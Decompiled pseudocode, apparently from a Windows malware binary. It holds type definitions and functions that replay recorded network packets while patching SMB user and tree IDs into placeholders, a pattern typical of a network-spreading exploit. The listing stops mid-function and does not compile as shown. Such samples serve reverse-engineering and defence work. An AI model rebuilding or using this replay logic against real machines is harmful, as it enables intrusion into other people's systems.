typedef unsigned char   undefined;

typedef unsigned int    ImageBaseOffset32;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    dword hash;
    void * spare;
    char[0] name;
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor * pType;
    ptrdiff_t dispCatchObj;
    void * addressOfHandler;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

typedef int __ehstate_t;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType * pHandlerArray;
};

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (* action)(void);
};

typedef unsigned short    wchar16;
typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef void * HINTERNET;

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_FuncInfo FuncInfo;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry * pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry * pTryBlockMap;
    uint nIPMapEntries;
    void * pIPToStateMap;
};

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef void * HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void * PVOID;

typedef ulong DWORD;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void * LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _OVERLAPPED * LPOVERLAPPED;

typedef struct _SECURITY_ATTRIBUTES * LPSECURITY_ATTRIBUTES;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR * LPSTR;

typedef ushort WORD;

typedef uchar BYTE;

typedef BYTE * LPBYTE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _STARTUPINFOA * LPSTARTUPINFOA;

typedef struct _PROCESS_INFORMATION * LPPROCESS_INFORMATION;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION * PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG * PRTL_CRITICAL_SECTION_DEBUG;

typedef long LONG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * Flink;
    struct _LIST_ENTRY * Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION * CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD * ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD * PEXCEPTION_RECORD;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT * PCONTEXT;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef uint uintptr_t;

typedef longlong __time64_t;

typedef uint size_t;

typedef __time64_t time_t;

typedef struct _startupinfo _startupinfo, *P_startupinfo;

struct _startupinfo {
    int newmode;
};

typedef struct _Lockit _Lockit, *P_Lockit;

struct _Lockit { // PlaceHolder Class Structure
};

typedef struct _SERVICE_TABLE_ENTRYA _SERVICE_TABLE_ENTRYA, *P_SERVICE_TABLE_ENTRYA;

typedef struct _SERVICE_TABLE_ENTRYA SERVICE_TABLE_ENTRYA;

typedef void (* LPSERVICE_MAIN_FUNCTIONA)(DWORD, LPSTR *);

struct _SERVICE_TABLE_ENTRYA {
    LPSTR lpServiceName;
    LPSERVICE_MAIN_FUNCTIONA lpServiceProc;
};

typedef struct SERVICE_STATUS_HANDLE__ SERVICE_STATUS_HANDLE__, *PSERVICE_STATUS_HANDLE__;

struct SERVICE_STATUS_HANDLE__ {
    int unused;
};

typedef struct _SERVICE_STATUS _SERVICE_STATUS, *P_SERVICE_STATUS;

struct _SERVICE_STATUS {
    DWORD dwServiceType;
    DWORD dwCurrentState;
    DWORD dwControlsAccepted;
    DWORD dwWin32ExitCode;
    DWORD dwServiceSpecificExitCode;
    DWORD dwCheckPoint;
    DWORD dwWaitHint;
};

typedef struct _SERVICE_STATUS * LPSERVICE_STATUS;

typedef struct SC_HANDLE__ SC_HANDLE__, *PSC_HANDLE__;

typedef struct SC_HANDLE__ * SC_HANDLE;

struct SC_HANDLE__ {
    int unused;
};

typedef void (* LPHANDLER_FUNCTION)(DWORD);

typedef struct SERVICE_STATUS_HANDLE__ * SERVICE_STATUS_HANDLE;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef CHAR * LPCSTR;

typedef wchar_t WCHAR;

typedef WCHAR * LPCWSTR;

typedef WCHAR * PWSTR;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR HCRYPTPROV;

typedef ULONG_PTR DWORD_PTR;

typedef ULONG_PTR SIZE_T;

typedef int (* FARPROC)(void);

typedef DWORD * LPDWORD;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef HANDLE HGLOBAL;

typedef struct HINSTANCE__ * HINSTANCE;

typedef void * LPCVOID;

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

typedef struct HRSRC__ * HRSRC;

struct HRSRC__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef HANDLE HLOCAL;

typedef uint UINT;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct Var Var, *PVar;

struct Var {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct StringFileInfo StringFileInfo, *PStringFileInfo;

struct StringFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct StringTable StringTable, *PStringTable;

struct StringTable {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_WRITE=2147483648,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_TYPE_NO_PAD=8
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct VS_VERSION_INFO VS_VERSION_INFO, *PVS_VERSION_INFO;

struct VS_VERSION_INFO {
    word StructLength;
    word ValueLength;
    word StructType;
    wchar16 Info[16];
    byte Padding[2];
    dword Signature;
    word StructVersion[2];
    word FileVersion[4];
    word ProductVersion[4];
    dword FileFlagsMask[2];
    dword FileFlags;
    dword FileOS;
    dword FileType;
    dword FileSubtype;
    dword FileTimestamp;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct VarFileInfo VarFileInfo, *PVarFileInfo;

struct VarFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_2 IMAGE_RESOURCE_DIR_STRING_U_2, *PIMAGE_RESOURCE_DIR_STRING_U_2;

struct IMAGE_RESOURCE_DIR_STRING_U_2 {
    word Length;
    wchar16 NameString[1];
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct StringInfo StringInfo, *PStringInfo;

struct StringInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef int (* _onexit_t)(void);

void FUN_00401010(void) {
  undefined local_2;
  undefined local_1;
  
  FUN_00408200(&DAT_00431468,&local_1,&local_2);
  return;
}

char * __cdecl FUN_00401140(char *param_1,char *param_2,int param_3) {
  char cVar1;
  byte bVar2;
  int iVar3;
  char *pcVar4;
  char *pcVar5;
  char *pcVar6;
  bool bVar7;
  
  iVar3 = -1;
  pcVar5 = param_2;
  do {
    bVar2 = (byte)iVar3;
    if (iVar3 == 0) break;
    iVar3 = iVar3 + -1;
    bVar2 = (byte)iVar3;
    cVar1 = *pcVar5;
    pcVar5 = pcVar5 + 1;
  } while (cVar1 != '\0');
  pcVar5 = param_1 + (param_3 - (int)(char)(~bVar2 - 1));
  if (param_1 <= pcVar5) {
    do {
      bVar7 = true;
      iVar3 = (int)(char)(~bVar2 - 1);
      pcVar4 = param_1;
      pcVar6 = param_2;
      do {
        if (iVar3 == 0) break;
        iVar3 = iVar3 + -1;
        bVar7 = *pcVar4 == *pcVar6;
        pcVar4 = pcVar4 + 1;
        pcVar6 = pcVar6 + 1;
      } while (bVar7);
      if (bVar7) {
        return param_1;
      }
      param_1 = param_1 + 1;
    } while (param_1 <= pcVar5);
  }
  return (char *)0x0;
}

uint __cdecl
FUN_00401190(undefined4 *param_1,uint param_2,undefined4 *param_3,char *param_4,char *param_5) {
  char cVar1;
  char *pcVar2;
  uint uVar3;
  uint uVar4;
  char *pcVar5;
  char *pcVar6;
  uint uVar7;
  undefined4 *puVar8;
  char *pcVar9;
  undefined4 *puVar10;
  
  pcVar2 = FUN_00401140((char *)param_1,s___USERID__PLACEHOLDER___00431278,param_2);
  puVar8 = param_1;
  if (pcVar2 != (char *)0x0) {
    pcVar5 = pcVar2 + -(int)param_1;
    uVar3 = (uint)pcVar5 >> 2;
    puVar10 = param_3;
    while (uVar3 != 0) {
      uVar3 = uVar3 - 1;
      *puVar10 = *puVar8;
      puVar8 = puVar8 + 1;
      puVar10 = puVar10 + 1;
    }
    uVar3 = (uint)pcVar5 & 3;
    while (uVar3 != 0) {
      uVar3 = uVar3 - 1;
      *(undefined *)puVar10 = *(undefined *)puVar8;
      puVar8 = (undefined4 *)((int)puVar8 + 1);
      puVar10 = (undefined4 *)((int)puVar10 + 1);
    }
    pcVar5[(int)param_3] = *param_4;
    (pcVar5 + 1)[(int)param_3] = param_4[1];
    uVar3 = 0xffffffff;
    pcVar6 = s___USERID__PLACEHOLDER___00431278;
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *pcVar6;
      pcVar6 = pcVar6 + 1;
    } while (cVar1 != '\0');
    uVar7 = (param_2 - (int)pcVar5) - (~uVar3 - 1);
    uVar3 = 0xffffffff;
    pcVar6 = s___USERID__PLACEHOLDER___00431278;
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *pcVar6;
      pcVar6 = pcVar6 + 1;
    } while (cVar1 != '\0');
    uVar4 = uVar7 >> 2;
    puVar8 = (undefined4 *)(pcVar2 + (~uVar3 - 1));
    puVar10 = (undefined4 *)(pcVar5 + 2 + (int)param_3);
    while (uVar4 != 0) {
      uVar4 = uVar4 - 1;
      *puVar10 = *puVar8;
      puVar8 = puVar8 + 1;
      puVar10 = puVar10 + 1;
    }
    uVar7 = uVar7 & 3;
    while (uVar7 != 0) {
      uVar7 = uVar7 - 1;
      *(undefined *)puVar10 = *(undefined *)puVar8;
      puVar8 = (undefined4 *)((int)puVar8 + 1);
      puVar10 = (undefined4 *)((int)puVar10 + 1);
    }
    uVar3 = 0xffffffff;
    pcVar5 = s___USERID__PLACEHOLDER___00431278;
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *pcVar5;
      pcVar5 = pcVar5 + 1;
    } while (cVar1 != '\0');
    param_2 = (param_2 - (~uVar3 - 1)) + 2;
    puVar8 = param_3;
  }
  pcVar5 = FUN_00401140((char *)puVar8,s___TREEID__PLACEHOLDER___00431260,param_2);
  if (pcVar5 != (char *)0x0) {
    pcVar6 = pcVar5 + -(int)puVar8;
    uVar3 = (uint)pcVar6 >> 2;
    puVar10 = param_3;
    while (uVar3 != 0) {
      uVar3 = uVar3 - 1;
      *puVar10 = *puVar8;
      puVar8 = puVar8 + 1;
      puVar10 = puVar10 + 1;
    }
    uVar3 = (uint)pcVar6 & 3;
    while (uVar3 != 0) {
      uVar3 = uVar3 - 1;
      *(undefined *)puVar10 = *(undefined *)puVar8;
      puVar8 = (undefined4 *)((int)puVar8 + 1);
      puVar10 = (undefined4 *)((int)puVar10 + 1);
    }
    pcVar6[(int)param_3] = *param_5;
    (pcVar6 + 1)[(int)param_3] = param_5[1];
    uVar3 = 0xffffffff;
    pcVar9 = s___TREEID__PLACEHOLDER___00431260;
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *pcVar9;
      pcVar9 = pcVar9 + 1;
    } while (cVar1 != '\0');
    uVar7 = (param_2 - (int)pcVar6) - (~uVar3 - 1);
    uVar3 = 0xffffffff;
    pcVar9 = s___USERID__PLACEHOLDER___00431278;
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *pcVar9;
      pcVar9 = pcVar9 + 1;
    } while (cVar1 != '\0');
    uVar4 = uVar7 >> 2;
    puVar8 = (undefined4 *)(pcVar5 + (~uVar3 - 1));
    puVar10 = (undefined4 *)(pcVar6 + 2 + (int)param_3);
    while (uVar4 != 0) {
      uVar4 = uVar4 - 1;
      *puVar10 = *puVar8;
      puVar8 = puVar8 + 1;
      puVar10 = puVar10 + 1;
    }
    uVar7 = uVar7 & 3;
    while (uVar7 != 0) {
      uVar7 = uVar7 - 1;
      *(undefined *)puVar10 = *(undefined *)puVar8;
      puVar8 = (undefined4 *)((int)puVar8 + 1);
      puVar10 = (undefined4 *)((int)puVar10 + 1);
    }
    uVar3 = 0xffffffff;
    pcVar6 = s___TREEID__PLACEHOLDER___00431260;
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *pcVar6;
      pcVar6 = pcVar6 + 1;
    } while (cVar1 != '\0');
    param_2 = param_2 + (2 - (~uVar3 - 1));
  }
  if ((pcVar2 == (char *)0x0) && (pcVar5 == (char *)0x0)) {
    uVar3 = param_2 >> 2;
    while (uVar3 != 0) {
      uVar3 = uVar3 - 1;
      *param_3 = *param_1;
      param_1 = param_1 + 1;
      param_3 = param_3 + 1;
    }
    uVar3 = param_2 & 3;
    while (uVar3 != 0) {
      uVar3 = uVar3 - 1;
      *(undefined *)param_3 = *(undefined *)param_1;
      param_1 = (undefined4 *)((int)param_1 + 1);
      param_3 = (undefined4 *)((int)param_3 + 1);
    }
  }
  return param_2;
}

void FUN_00401310(void) {
  int **ppiVar1;
  int **ppiVar2;
  int **ppiVar3;
  
  ppiVar3 = (int **)*DAT_0043146c;
  if (ppiVar3 != DAT_0043146c) {
    do {
      Ordinal_3(ppiVar3[4]);
      ppiVar2 = (int **)ppiVar3[2];
      if (ppiVar2 == DAT_0070f878) {
        ppiVar2 = (int **)ppiVar3[1];
        if (ppiVar3 == (int **)ppiVar2[2]) {
          do {
            ppiVar3 = ppiVar2;
            ppiVar2 = (int **)ppiVar3[1];
          } while (ppiVar3 == (int **)ppiVar2[2]);
        }
        if ((int **)ppiVar3[2] != ppiVar2) {
          ppiVar3 = ppiVar2;
        }
      }
      else {
        ppiVar1 = (int **)*ppiVar2;
        while (ppiVar3 = ppiVar2, ppiVar1 != DAT_0070f878) {
          ppiVar2 = ppiVar1;
          ppiVar1 = (int **)*ppiVar1;
        }
      }
    } while (ppiVar3 != DAT_0043146c);
  }
  return;
}

void __cdecl
FUN_00401370(int *param_1,undefined4 param_2,int *param_3,undefined4 param_4,int *param_5,
            undefined4 param_6,double param_7,int *param_8,undefined4 param_9,int *param_10,
            undefined4 param_11,DWORD param_12,undefined4 param_13,int *param_14,undefined4 param_15
            ,int *param_16,undefined4 param_17,double param_18,uint param_19) {
  double dVar1;
  short sVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  short *psVar6;
  undefined4 *puVar7;
  undefined8 uVar8;
  
  FUN_00409860();
  piVar3 = (int *)GetTickCount();
  param_1 = piVar3;
  FUN_00401d80();
  FUN_004082c0(&DAT_00431468,&param_1,(int **)*DAT_0043146c,DAT_0043146c);
  psVar6 = &DAT_00431480;
  do {
    param_7 = (double)ZEXT48(piVar3);
    dVar1 = *(double *)(psVar6 + 0x1390);
    param_1 = (int *)GetTickCount();
    dVar1 = dVar1 * 1000.00000000 - ((double)ZEXT48(param_1) - param_7);
    if ((ushort)((ushort)(dVar1 < 0.00000000) << 8 | (ushort)(dVar1 == 0.00000000) << 0xe) == 0) {
      uVar8 = _ftol();
      FUN_00401660((uint)uVar8,(uint)((ulonglong)uVar8 >> 0x20));
    }
    piVar3 = (int *)GetTickCount();
    sVar2 = *psVar6;
    if (sVar2 == 2) {
      Ordinal_11();
      Ordinal_9();
      iVar4 = Ordinal_23();
      if (iVar4 == -1) {
        FUN_00401310();
        return;
      }
      iVar5 = Ordinal_4();
      if (iVar5 == -1) {
        Ordinal_3();
        goto LAB_00401640;
      }
      param_10 = *(int **)(psVar6 + 2);
      FUN_00408390(&DAT_00431468,&param_14,&param_10);
      param_14[4] = iVar4;
    }
    else {
      if (sVar2 == 3) {
        param_5 = *(int **)(psVar6 + 2);
        FUN_00408390(&DAT_00431468,(int **)&stack0x0000006c,&param_5);
        Ordinal_3();
      }
      else {
        if (sVar2 == 0) {
          iVar4 = 0x9c4;
          puVar7 = (undefined4 *)&stack0x00000874;
          while (iVar4 != 0) {
            iVar4 = iVar4 + -1;
            *puVar7 = 0;
            puVar7 = puVar7 + 1;
          }
          FUN_00401190((undefined4 *)(psVar6 + 6),*(uint *)(psVar6 + 4),
                       (undefined4 *)&stack0x00000874,(char *)register0x00000010,&stack0x00000002);
          param_8 = *(int **)(psVar6 + 2);
          FUN_00408390(&DAT_00431468,(int **)&stack0x00000064,&param_8);
          iVar4 = Ordinal_19();
          if (iVar4 == -1) {
LAB_00401640:
            FUN_00401310();
            Sleep(1000);
            return;
          }
        }
        else {
          if (sVar2 == 1) {
            param_3 = *(int **)(psVar6 + 2);
            FUN_00408390(&DAT_00431468,&param_16,&param_3);
            iVar4 = Ordinal_16();
            if (iVar4 == -1) goto LAB_00401640;
            if (3 < *(int *)(psVar6 + 4)) {
              _stricmp((char *)(psVar6 + 6),s_treeid_00431298);
              _stricmp((char *)(psVar6 + 6),s_userid_00431290);
            }
          }
        }
      }
    }
